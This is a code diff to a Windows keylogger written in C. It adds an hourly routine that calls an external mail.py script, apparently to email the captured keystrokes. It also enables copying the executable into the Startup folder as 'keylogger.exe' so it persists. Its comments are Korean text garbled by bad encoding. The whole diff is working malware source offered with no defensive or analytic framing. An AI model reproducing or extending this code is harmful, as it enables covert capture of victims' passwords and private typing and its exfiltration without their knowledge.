@@ -18,6 +18,8 @@ KBDLLHOOKSTRUCT kbdStruct;
 
 int Save(int key_stroke, char *file);
 
+time_t start_time;
+
 extern char lastwindow[256];
 
 // This is the callback function. Consider it the event that is raised when, in this case, 
@@ -61,6 +63,8 @@ void ReleaseHook()
 int Save(int key_stroke, char *file)
 {
 	char lastwindow[256];
+	time_t current_time;
+
 
 	if ((key_stroke == 1) || (key_stroke == 2))
 		return 0; // ignore mouse clicks
@@ -145,6 +149,17 @@ int Save(int key_stroke, char *file)
 	// NOTE: Numpad-Keys seem to print as lowercase letters
 
 	fclose(OUTPUT_FILE);
+	
+	time(&current_time); //ÇöÀç ½Ã°£À» ÃøÁ¤
+	
+	if (current_time - start_time < 3600); //1½Ã°£ÀÌ Áö³ªÁö ¾Ê¾ÒÀ¸¸é ¾Æ¹«°Íµµ ¼öÇàÇÏÁö ¾ÊÀ½
+	else // 1½Ã°£ÀÌ Áö³µÀ» ¶§
+	{
+		system("C:\\Python27\\mail.py");//mail.py °æ·Î ÁöÁ¤ÇØ¾ß ÇÔ. //¸ÞÀÏ º¸³¿
+		start_time = time(&start_time); //start_timeÀ» ´Ù½Ã ÇöÀç ½Ã°£À¸·Î ¹Ù²Þ
+	}
+
+	
 	return 0;
 }
 
@@ -238,10 +253,13 @@ void Stealth()
 	// Set the hook
 	SetHook();
 	
+	time(&start_time); //Ã³À½ ½ÃÀÛ ½Ã°£À» Àç´Â ÇÔ¼ö
+
+	
 	CopyFile("untitled1.exe", "C:\\users\\default\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\startup\\keylogger.exe", TRUE);
 	// ê´€ë¦¬ìž ëª¨ë“œì—ì„œì´ í”„ë¡œê·¸ëž¨ì„ ì‹¤í–‰í•˜ë©´ ì»´í“¨í„°ê°€ ì‹œìž‘ë  ë•Œ ì‹¤í–‰ë©ë‹ˆë‹¤.
 	MSG msg;
-	//system("copy Untitled1.exe C:\\Users\\default\\AppData\\Roaming\\Microsoft\\Windows\\");
+	system("copy Untitled1.exe C:\\Users\\default\\AppData\\Roaming\\Microsoft\\Windows\\");
 	 
 	 file_count();
 	while (GetMessage(&msg, NULL, 0, 0))
